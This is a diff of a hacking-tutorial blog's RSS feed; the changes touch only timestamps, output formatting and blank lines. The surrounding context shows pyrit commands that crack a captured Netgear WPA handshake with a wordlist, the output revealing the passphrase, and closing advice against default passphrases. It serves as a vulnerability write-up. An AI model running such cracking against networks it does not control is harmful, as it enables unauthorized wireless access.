@@ -2,8 +2,8 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
 <channel><title>m3t4lk3y</title><link>https://metalkey.net/index.html</link>
 <description>Hacking tutorials + info</description><language>en</language>
-<lastBuildDate>Fri, 01 Jul 2016 09:08:38 +1000</lastBuildDate>
-<pubDate>Fri, 01 Jul 2016 09:08:38 +1000</pubDate>
+<lastBuildDate>Fri, 01 Jul 2016 09:11:21 +1000</lastBuildDate>
+<pubDate>Fri, 01 Jul 2016 09:11:21 +1000</pubDate>
 <atom:link href="https://metalkey.net/feed.rss" rel="self" type="application/rss+xml" />
 <item><title>
 Metasploit Browser Autopwn – Windows XP SP2
@@ -121,10 +121,10 @@ Tutorial @ SecurityTube - <a href="http://www.securitytube.net/groups?operation=
 <font color="silver">user@debian8:~$</font> <b>pyrit -r netgear.cap -o stripped-netgear.cap strip</b><br>
 <font color="silver">user@debian8:~$</font> <b>pyrit -r stripped-netgear.cap -i adjective_noun_3d.txt -b 00:11:22:33:44:55 attack_passthrough</b><br>
 <font color="silver">...</font><br>
-<font color="silver">.Parsing file 'stripped-netgear.cap' (1/1)...</font><br>
-<font color="silver">.Parsed 10 packets (10 802.11-packets), got 1 AP(s)</font><br>
-<font color="silver">.Tried 12235614 PMKs so far; 25683 PMKs per second.</font><br>
-<font color="silver">.The password is</font> <b>'magicalsquash835'</b><br>
+<font color="silver">Parsing file 'stripped-netgear.cap' (1/1)...</font><br>
+<font color="silver">Parsed 10 packets (10 802.11-packets), got 1 AP(s)</font><br>
+<font color="silver">Tried 12235614 PMKs so far; 25683 PMKs per second.</font><br>
+<font color="silver">The password is</font> <b>'magicalsquash835'</b><br>
 </div>
 
 <p></code></p>
@@ -134,9 +134,6 @@ Tutorial @ SecurityTube - <a href="http://www.securitytube.net/groups?operation=
 <p>Never use the default passphrase provided with your router and always use complex passwords that do not follow predictable patterns.</p>
 
 <p>Tags: <a href='tag_wifi.html'>wifi</a></p>
-
-
-
 <!-- text end -->
 ]]></description><link>https://metalkey.net/netgear-wireless-router-default-passphrase-vulnerability.html</link>
 <guid>https://metalkey.net/./netgear-wireless-router-default-passphrase-vulnerability.html</guid>
